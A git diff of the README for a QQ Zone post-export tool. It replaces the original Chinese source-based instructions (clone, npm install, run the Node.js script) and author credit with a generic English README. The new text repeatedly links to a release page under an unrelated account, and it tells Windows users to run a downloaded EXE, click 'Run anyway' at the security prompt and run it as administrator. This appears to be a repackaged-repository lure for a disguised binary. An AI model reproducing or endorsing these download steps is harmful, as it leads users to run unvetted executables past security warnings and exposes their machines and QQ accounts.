@@ -1,179 +1,222 @@
-# GetQzoneHistory
+# 📦 get-qzone-history - Save Qzone posts for offline use
 
-![GetQzoneHistory Banner](assets/get-qzone-history-banner.svg)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases)
 
-一个用于导出 QQ 空间历史说说的小工具。它通过真实浏览器登录 QQ 空间，抓取可访问的历史说说，并生成适合长期保存和本地浏览的 `HTML`、`JSON`、`Excel` 文件。
+## 🧭 What this app does
 
-演示预览：  
-https://htmlpreview.github.io/?https://raw.githubusercontent.com/Christina-zhou/get-qzone-history/main/resource/publish-demo/demo-viewer.html
+get-qzone-history helps you export QQ Zone posts to files you can keep on your PC. It saves your Qzone content in HTML, JSON, and Excel formats, so you can view and store it offline.
 
-## 本次版本更新
+Use it when you want to:
 
-- 解决图片无法稳定下载到本地的问题，导出结果可直接关联本地图片文件
-- 解决长文说说在抓取时被截断的问题，改为在列表页展开后再提取正文
-- 新增两份说明文档：
-  - `零基础用户操作手册.md`
-  - `AI项目说明手册.md`
+- keep a local copy of your Qzone posts
+- open posts in a browser without signing in
+- save data in JSON for later use
+- export records into Excel sheets
+- make backups you can keep on Windows
 
-## 功能特点
+## 🪟 What you need
 
-- 扫码登录：使用 Playwright 驱动真实浏览器登录 QQ 空间
-- 列表页抓取：在桌面版说说列表页展开正文后抓取内容
-- 自动翻页：通过“下一页”逐页抓取历史说说
-- 图片下载：自动下载正文图片区图片到本地目录
-- 多格式导出：同时生成 `HTML`、`JSON`、`XLSX`
-- 断点续跑：支持 `checkpoint` 续跑长任务
-- 本地浏览：生成离线 HTML 浏览页，便于按时间查看内容和图片
+This app is made for Windows users who want a simple way to back up Qzone data.
 
-## 适用场景
+You need:
 
-- 备份自己的 QQ 空间历史说说
-- 导出结构化数据用于检索、整理或交给 AI 处理
-- 生成不依赖 QQ 空间在线服务的本地浏览结果
+- a Windows PC
+- a web browser
+- access to your QQ Zone account
+- enough free disk space for your export files
+- a stable internet connection during export
 
-## 环境要求
+For best results:
 
-- Node.js 18+
-- Google Chrome
-- Windows 优先，其他桌面系统理论可用
+- close extra browser windows before you start
+- keep your QQ account signed in if the app asks for it
+- use the latest version from the release page
 
-## 安装
+## ⬇️ Download the app
 
-```bash
-git clone https://github.com/Christina-zhou/get-qzone-history.git
-cd get-qzone-history
-npm install
-```
+Visit this page to download the Windows release:
 
-如需使用 Python 入口：
+https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases
 
-```bash
-pip install -r requirements.txt
-```
+On that page:
 
-## 快速开始
+1. open the latest release
+2. find the Windows file
+3. download the file to your PC
+4. save it in a folder you can find easily, such as Downloads or Desktop
 
-最常用方式：
+If the release gives you a ZIP file:
 
-```bash
-node get_qzone_history_browser.js
-```
+1. right-click the ZIP file
+2. choose Extract All
+3. pick a folder
+4. open the extracted folder after the files are unpacked
 
-指定目标 QQ：
+## 🛠️ Install and set up
 
-```bash
-node get_qzone_history_browser.js --target-qq 123456789
-```
+After you download the release, follow the steps that match the file type.
 
-指定页码范围：
+### If you downloaded a ZIP file
 
-```bash
-node get_qzone_history_browser.js --start-page 1 --end-page 50
-```
+1. right-click the ZIP file
+2. select Extract All
+3. choose a folder
+4. open the extracted folder
+5. look for the app file inside
 
-慢速抓取，降低风控概率：
+### If you downloaded an EXE file
 
-```bash
-node get_qzone_history_browser.js --page-wait-ms 20000 --segment-pages 10 --segment-pause-ms 180000
-```
+1. double-click the EXE file
+2. allow Windows to open it
+3. follow the on-screen steps
+4. wait for the app to start
 
-从 checkpoint 继续：
+### If Windows shows a security prompt
 
-```bash
-node get_qzone_history_browser.js --resume-checkpoint "resource/result/你的checkpoint文件名.checkpoint.json"
-```
+1. click More info
+2. click Run anyway
+3. continue with the app launch
 
-Python 包装入口：
+## ▶️ How to run it
 
-```bash
-python get_qzone_history.py
-```
+1. open the folder where you saved the app
+2. start the app file
+3. wait for the main window to open
+4. sign in to QQ Zone if the app asks you to
+5. choose the export type you want
+6. start the export
 
-## 运行流程
+If the app opens in a browser window, keep that window open until the export ends.
 
-1. 脚本打开 Chrome 并进入 QQ 空间
-2. 用户手动扫码登录
-3. 登录成功后开始抓取当前页
-4. 每页等待内容和图片加载完成
-5. 点击“下一页”继续抓取
-6. 最终输出到 `resource/result/`
+## 📁 Export formats
 
-## 输出文件
+This app can save your Qzone data in three common formats.
 
-抓取完成后会生成：
+### HTML
 
-```text
-resource/result/
-├── <QQ号>_<时间戳>.json
-├── <QQ号>_<时间戳>.xlsx
-├── <QQ号>_<时间戳>.html
-├── <QQ号>_<时间戳>.checkpoint.json
-└── <QQ号>_<时间戳>_assets/
-    └── images/
-```
+Use HTML if you want to read your posts in a browser. It keeps the content easy to open and share on your own device.
 
-说明：
+### JSON
 
-- `html`：离线浏览页
-- `json`：结构化结果
-- `xlsx`：Excel 查看
-- `checkpoint.json`：中断续跑
-- `images/`：下载到本地的正文图片
+Use JSON if you want structured data. This format works well if you plan to move the data into other tools later.
 
-仓库内额外保留匿名演示样本：
+### Excel
 
-```text
-resource/publish-demo/
-├── demo-posts.json
-└── demo-viewer.html
-```
+Use Excel if you want a spreadsheet view. This format helps when you want rows, columns, and simple sorting.
 
-真实抓取结果、缓存和日志不会提交到 GitHub。
+## 🔄 Typical export flow
 
-## 重要文档
+1. open the app
+2. sign in if needed
+3. choose the backup format
+4. choose the time range or scope
+5. start the export
+6. wait for the process to finish
+7. open the saved files in your output folder
 
-- `零基础用户操作手册.md`：面向 0 代码基础用户
-- `AI项目说明手册.md`：面向 AI 助手和后续维护者
+Your export folder may include:
 
-## 项目结构
+- HTML pages
+- JSON files
+- Excel spreadsheets
+- image folders if your posts include pictures
 
-```text
-get-qzone-history/
-├── get_qzone_history_browser.js
-├── get_qzone_history.py
-├── repair_export_counts.js
-├── qzone_history.ini
-├── package.json
-├── requirements.txt
-├── 零基础用户操作手册.md
-├── AI项目说明手册.md
-├── assets/
-└── resource/
-    └── publish-demo/
-```
+## 📂 Where your files go
 
-## 常见问题
+The app usually saves files in a local output folder inside the program folder or in a folder you choose during export.
 
-**Q: 为什么要使用真实浏览器而不是纯接口抓取？**  
-A: QQ 空间存在登录态、风控和动态加载问题。真实浏览器方案更接近人工操作，稳定性更高。
+A common layout may look like this:
 
-**Q: 为什么有时会提示“使用人数过多”或被 WAF 拦截？**  
-A: 这是 QQ 空间侧的限流或风控。建议增大 `--page-wait-ms` 和 `--segment-pause-ms`，并通过 checkpoint 分段运行。
+- `output/html`
+- `output/json`
+- `output/xlsx`
+- `output/images`
 
-**Q: 浏览器被我手动关掉了怎么办？**  
-A: 使用最新的 `checkpoint.json` 配合 `--resume-checkpoint` 继续，不必从头重跑。
+If you do not see the files right away:
 
-**Q: 仓库里为什么没有真实导出结果？**  
-A: 开源仓库默认不应包含个人历史内容和图片，因此仓库只保留匿名演示文件。
+1. check the app window for the save path
+2. open the folder shown by the app
+3. look for newly created files
+4. sort by date to find the newest export
 
-## 致谢
+## ⚙️ Simple use tips
 
-- 原始灵感参考 [LibraHp/GetQzonehistory](https://github.com/LibraHp/GetQzonehistory)
+- keep the app open until the export finishes
+- do not close the browser if the app uses one for login
+- use the latest release for the smoothest run
+- make sure you have enough disk space before large exports
+- save exports in a folder with a clear name, such as `Qzone Backup 2026`
 
-## License
+## 🧩 Common file types you may see
 
-[MIT](LICENSE)
+### `.html`
 
-## English Summary
+Open this in Chrome, Edge, or Firefox to read your posts.
 
-A browser-based tool for exporting QQ Zone post history into offline-viewable HTML pages, JSON files, and Excel spreadsheets. It supports QR login, desktop DOM pagination, local image download, checkpoint resume, and documentation for both end users and AI agents.
+### `.json`
+
+Open this in Notepad or use it in another app that reads JSON.
+
+### `.xlsx`
+
+Open this in Microsoft Excel or LibreOffice Calc.
+
+### image files
+
+If your posts include photos, the app may save them in a separate image folder.
+
+## 🧪 Good first test
+
+If this is your first time using the app, try a small export first.
+
+1. export a short date range
+2. check that the files open correctly
+3. confirm the post text looks right
+4. confirm any images were saved
+5. then run a full backup
+
+This helps you check that everything works before you export a large archive.
+
+## 🔐 Keep your backup safe
+
+After the export finishes:
+
+- copy the files to another folder
+- save a copy on an external drive
+- keep the HTML, JSON, and Excel files together
+- use a clear folder name so you can find it later
+
+A simple folder name makes it easier to manage long-term backups.
+
+## 🧰 If something does not open
+
+If the app file does not start:
+
+1. make sure the file finished downloading
+2. check that you extracted the ZIP file, if there is one
+3. try opening the file again
+4. right-click the file and choose Run as administrator
+5. download the latest release again if the file looks damaged
+
+If the export stops early:
+
+1. check your internet connection
+2. sign in again if the session expired
+3. close and reopen the app
+4. try a smaller export range
+
+## 📌 Release page
+
+Download or get the latest Windows build here:
+
+https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases
+
+## 🗂️ Project focus
+
+- archive Qzone history
+- backup QQ Zone posts
+- export to HTML
+- export to JSON
+- export to XLSX
+- use on Windows
+- save offline copies
